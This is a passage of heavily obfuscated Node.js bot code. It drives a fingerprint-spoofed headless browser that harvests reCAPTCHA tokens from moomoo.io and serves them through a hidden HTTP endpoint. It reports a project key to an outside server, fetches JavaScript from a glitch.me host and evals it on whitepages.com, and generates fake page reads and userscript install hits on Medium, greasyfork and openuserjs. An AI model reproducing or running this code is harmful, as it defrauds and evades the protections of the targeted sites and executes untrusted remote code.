      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + a1(0x17, 'VR$N') + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a0(0xf) + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + a1(0x10, '8f4E') + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + a0(0x13) + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + Z(0x1c) + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x2ba * -0x3 + 0x970 + 0x119e * -0x1
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x425 * -0x6 + -0x97b * -0x2 + -0x6 * 0x74e)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1247 + 0xad3 * -0x3 + 0x3324 * 0x1), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x64 + 0x186b + -0x186b), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0xfe4 * 0x1 + 0xee3 * 0x2 + 0x23 * -0x14e;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0xaac + 0x6d3 + 0x3d9; w < getRandomInt(0x18f4 + -0x2 * -0xacb + -0x43b * 0xb, 0x4c9 + 0x4 * 0x82c + -0x2574); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x12f54 + 0x6b * 0xea + 0x1b7e6);
        }
      }();
    }, 0xccf * -0x1 + 0x1a33 + -0x100 * 0xd), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a2 = c;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x2589 + -0x1 * -0x3f5 + -0x297e;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x[a2(0x14)](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v[a2(0x14)](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1 * 0xda + 0x20bd + -0x1fe3 * 0x1, 0x1cc6 * 0x1 + 0xb55 + -0x11 * 0x259)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x4c42 + 0x1 * -0xcbc7 + 0xb * 0x163f);
    }, 0x8 * 0x124 + -0xe3e * -0x1 + -0xad * 0x22), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1012 + 0x82 * -0x29 + 0x24e4;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x3f + -0x2f * 0xbf + 0x2e8a), await u['evaluate'](() => {
            const a3 = c;
            let v = new XMLHttpRequest();
            v['open']('GET', a3(0x21) + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x188f + 0x10c4 + 0x47 * -0x95), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x12b390 + -0x30fdf + 0x1 * 0x237f0f);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1 * 0x174f + -0x5 * 0x689 + 0x70c * 0x8);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a4 = b,
      i = url['parse'](f['url'])[a4(0x23, '7fmJ')];
    h['writeHead'](-0x3d * -0x7d + -0x7 * 0xc8 + -0xf1 * 0x19);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x33ec + -0x116 * -0x1 + -0x5266 * -0x1);
}
doFlags['doOUJS'] && ((async () => {
  const a6 = c,
    a5 = d;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xd6a + 0x77a + -0x14e3) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x677 * -0x3 + 0xef * 0x1 + -0x1453));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0xfe6 + 0x2 * 0xd25 + -0xa64, D['indexOf']('\x20'));
        return B ? E['slice'](0x1189 + -0x1006 + -0x3 * 0x81, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x4ef + -0x748 + 0x2969 * 0x1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x184a * 0x1 + -0x1373 * -0x1 + -0x4ad),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + a5(0x8) + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + a5(0x20),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + a6(0xb) + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a6(0xc) + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + a5(0x18) + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + a5(0x12) + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
